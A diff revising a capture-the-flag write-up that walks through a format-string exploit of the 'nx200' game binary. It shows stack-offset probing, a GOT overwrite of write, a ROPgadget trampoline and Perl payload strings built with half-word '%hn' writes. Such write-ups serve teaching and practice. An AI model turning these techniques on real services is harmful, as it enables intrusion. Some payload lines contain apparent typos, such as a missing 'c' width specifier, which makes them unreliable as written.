@@ -1,9 +1,21 @@
-The exploit in action:
+Contents:
+1. The exploit in action
+2. Challenge Description
+3. Background Info Needed
+4. Tools Used During this Challenge
+5. Beating the Challenge
+6. Examining the Binary
+7. Writing the Format String
+
+
+
+1. The exploit in action:
 
 root@KaliBox:~# ./exploit.pl | nc -p 4222 0.0.0.0 9999
 
 Welcome warrior.  What is your name?
-You wake up in a cave.  You have no recollection of how you got here.You have 3 options:
+You wake up in a cave.  You have no recollection of how you got here. 
+You have 3 options:
 1. Wait here for something to happen.
 2. Go deeper into the cave.
 3. Exit the cave.
@@ -21,21 +33,21 @@ cat key
 It's nice and dark in here. Just the way the grues like it...
 
 
-Challenge Description: So what is this challenge all about? nx200 is a 
+2. Challenge Description: So what is this challenge all about? nx200 is a 
 binary that takes input to select a series of choices in a game where 
 you must defeat the grue.
 
-Background Info Needed: In order to defeat this challenge you will need
+3. Background Info Needed: In order to defeat this challenge you will need
 to have basic knowledge of shellcode (or where to find some), string
 exploits, programming in at least one language (this challenge is best
 done in perl or python), and last one of the following: knowledge of 
 assembly in order to understand the disassembled binary or be able to 
 decompile the source binary into a language you do understand (like C).
 
-Tools Used During this Challenge: flawfinder, objdump, gdb, hopper, 
+4. Tools Used During this Challenge: flawfinder, objdump, gdb, hopper, 
 netcat, and Retargetable Decompiler.
 
-Beating the Challenge: When I first work on a challenge I always like
+5. Beating the Challenge: When I first work on a challenge I always like
 to interact with the binary first so that I can see how it takes inputs.
 So the first thing I noticed is that it accepts general string-like input. 
 Second, I found that the program interacts with me through a series of 
@@ -43,7 +55,7 @@ menus. This means that I either have to A) Win the game or B) Cheat and
 win the game. Before I can do either I will need to examine the binary
 that is available to me.
 
-Examining the Binary: The first tool I used was flawfinder. Flawfinder
+6. Examining the Binary: The first tool I used was flawfinder. Flawfinder
 discovered two possible vulnerabilities - First, a possible format string
 exploit in snprintf and second, a possible read buffer overflow. Ok - so
 now I have two starting points. The next tool that I used was the 
@@ -59,4 +71,184 @@ without falling into a default else condition. However, I did eventually
 notice that the first initial read would take any input as long as it did
 not exceed 1024 bytes. This may be useful - but not for a buffer overflow.
 
-Then, I checked the snprintf possibility.
+Then, I checked the snprintf possibility. snprintf's arguments are as follows:
+
+		write(fd, str, snprintf(str, 1024, "")); 
+		
+which is exactly what we are looking for, a vulnerable function call! 
+snprintf will now write whatever content we want if we format our input 
+properly. But, where and how does the input get there? At the start of the 
+program it asked for our name (shown below) and then later it takes that 
+same string and passes it to snprintf without any checking or validation.
+
+		write(fd, "Welcome warrior.  What is your name?\n", 37);
+		int32_t fd2; // 0x80489a2
+		read(fd2, "", 1024); 
+
+Now that we know where the vulnerability is and how to pass our format 
+string exploit. The first thing we need to do it find the offset into the
+stack where we can take advantage of this vulnerability. I wrote a very
+simple perl one-liner that allows me to see the offset after we pass through
+several iterations of menu choices.
+
+		print "AAAA" . ".%x"x10 . "\n"';
+		
+After this string is passed to the vulnerable program we get the following 
+output. The first set of ASCII characters "AAAA" is just my preference and any
+4-byte sequence will work as long as you know the value in hex. AAAA translates
+to 41414141. The %x modifier for snprintf outputs a hexidecimal number. The benefit
+here is that if we can write to the stack when using a format string exploit we
+should see 41414141 pop up somewhere after all the arguments for snprintf() and write()
+are blown through. 
+
+--SNIP--
+
+Your instincts tell you something is amiss, and they've never lead you astray before.
+You plunge your sword into the man's chest.  His face contorts as his body crumples.
+In amazement, you watch as the man's form changes to that of a large and hideous grue!
+In your childhood you'd heard tale of the King of the Grue.  A vicious and fearsome beast,
+ capable of changing his appearance at will.
+You AAAA.ff8f5ba8.4.15d4b0.15d4b0.5.1000.1.41414141.3866662e.61623566
+have defeated the legendary King of the Grue!
+ 
+ --SNIP--
+ 
+As you can see the additional "." that we added is really only used for seperation and 
+readability. We can now also see that the 41414141 begins 8 arguments into the stack. So 
+now lets make this visual because it will help us later:
+
+++++++++++++++
+++  AAAA    ++   <== Our test input case
+++++++++++++++
+++	arg1		++   !-- %x not so useful yet
+++++++++++++++
+++  arg2    ++   !-- %x not so useful yet
+++++++++++++++
+++  arg3    ++   !-- %x not so useful yet
+++++++++++++++
+++  arg4    ++   !-- %x not so useful yet
+++++++++++++++
+++  arg5    ++   !-- %x not so useful yet
+++++++++++++++
+++  arg6    ++   !-- %x not so useful yet
+++++++++++++++
+++  arg7    ++   !-- %x not so useful yet
+++++++++++++++
+++ 41414141 ++   <== The first argument in the stack we can influence
+++++++++++++++
+
+7. Writing the Format String: Now we know we can write to the stack,
+the proper offset, and how to get the format string into snprintf (
+assuming you have already walked through the proper menu choices).
+Now the crafting of the format string. For simplicity I am removing
+the args that are no longer relevant (specifically args 1-7).
+
+The first step is to find an address that is static and writable,
+which will also allow us to take control of the program at the first
+available opportunity. In many cases including this one - when a program
+is dynamically linked the best target is usually a global offset table (GOT)
+entry. When we look at the binary the first call following snprintf is
+write. So that is the best choice for this program. Next, we need to find
+what the address is for write. One of the faster ways to do it is using 
+objdump. Type the following command to examine all the GOT table entries:
+
+		objdump -R <binary>
+		
+		Which outputs:
+		--SNIP--
+		0804b554 R_386_JUMP_SLOT   write
+		0804b558 R_386_JUMP_SLOT   bind
+		0804b55c R_386_JUMP_SLOT   snprintf
+		--SNIP--
+
+Now that we have the address we want to write to we need to get it in the
+proper format for the string exploit. So far we know that our offset begins
+at 8 and that the spot in the GOT we want to hijack is located at 0x804b554.
+You will notice that I have both a high and low jack spot. The reason is because
+we are doing two half-word writes to the GOT table 2 steps from now (I'll also
+explain why).
+
+		$hijack_spot="\x56\xb5\x04\x08";
+		$lojack_spot="\x54\xb5\x04\x08";
+		print $lojack_spot . $hijack_spot . "%9\$hn%8\$hn";
+		
+The Second step is to find an address to to write into our hijacked table entry.
+In order to do that we need to find a way to get our shellcode into memory
+from the stack. Since there is no way to tell what the address for our shell-
+code will be in advance we must depend on a gadget called a "trampoline". A
+trampoline is a piece of code that already exists inside the program which
+will allow an attacker to indirectly return to a location of their choosing 
+based on a forward pointer address already located in the stack. There are
+many tools that are available. The tool I used is called ROPgadget. Run the
+following command to find useful trampolines.
+
+		./ROPgadget.py --binary ~/Desktop/nx200 --only "pop|ret"
+		
+		Which gives us:
+		Gadgets information
+		============================================================
+		0x08049373 : pop ebp ; ret
+		0x080493d5 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+		0x080493d7 : pop edi ; pop ebp ; ret
+		0x080493d6 : pop esi ; pop edi ; pop ebp ; ret
+		0x08048526 : ret
+		0x080486de : ret -0x153f
+
+		Unique gadgets found: 6
+		
+Which gadget is the most useful to us at this point? In order to make that
+choice we need to understand how we will get to our shellcode following the
+snprintf. write has a specific prototype:
+
+		write(int fildes, const void *buf, size_t nbyte);
+		
+We know the first address in the stack when write is called will be the return
+address, the second address will be the file descriptor, and the third will be
+a pointer to the buffer (which subsequently has out shellcode). So that means
+we need two pops and a ret in order to take advantage of the pointer to our
+shellcode. Our target address should be 0x080493d7.
+
+The third step involves crafting the target address so that the half-word writes
+from Step 1 will function properly. But first, we need to do a little math because
+we will be writing the target address in decimal using the %c modifier. %c is used
+by printf as a length modifier, however it can also be used to write a value because
+it returns that length as a value to a target address (this enables the format string
+exploit). 
+
+		Math Calculations:
+		1. Split the hex value into two parts: \x0804 \x93d7
+		2. Convert the 1st value into decimal: \x0804 = 2052
+		3. Convert the 2nd value into decimal: \x93d7 = 37,847
+		4. Subtract the 1st decimal value from the 2nd decimal value: 37,847-2052 = 35,795
+		
+Now that we have our decimal values we can update our string exploit with the %c
+modifier and accompanying decimal values. As promised in step one - the reason we 
+write two half-words is because of the way the %c modifier works. For example: if 
+the %c modifier is written as such: %2052c then it will print 2,052 0x20 or space 
+characters. However that will only write a hexidecimal value of 804. Now if we want
+to write the entire address at one time 80493d7 it the %c modifier will need to write
+134,517,719 characters. Imagine having to do this in 64 bit or with an even larger
+hex value. That is why it makes sense to break up the writes into half-words.
+
+		$hijack_spot="\x56\xb5\x04\x08";
+		$lojack_spot="\x54\xb5\x04\x08";
+		print $lojack_spot . $hijack_spot . "%2052c%9\$hn%35795%8\$hn";
+		
+We are not done yet. Now we need to adjust our format exploit because the %c character
+width field will be off now. This is done by subtracting 8 from 2052, because there are
+8 characters before it (both hijack locations take 8 bytes).
+
+
+		$hijack_spot="\x56\xb5\x04\x08";
+		$lojack_spot="\x54\xb5\x04\x08";
+		print $lojack_spot . $hijack_spot . "%2044c%9\$hn%35795%8\$hn";
+		
+We now have two final steps in order to make the format string exploit. 1st we need 
+shellcode and then 2nd we need to adjust our format exploit again. For brevitiy, 
+let's say that our shellcode is 84 bytes long. That means we need to subtract another 
+84 bytes from the first character width field.
+
+		$shellcode="84 bytes of shellcode";
+		$hijack_spot="\x56\xb5\x04\x08";
+		$lojack_spot="\x54\xb5\x04\x08";
+		print $shellcode . $lojack_spot . $hijack_spot . "%1960c%9\$hn%35795%8\$hn";
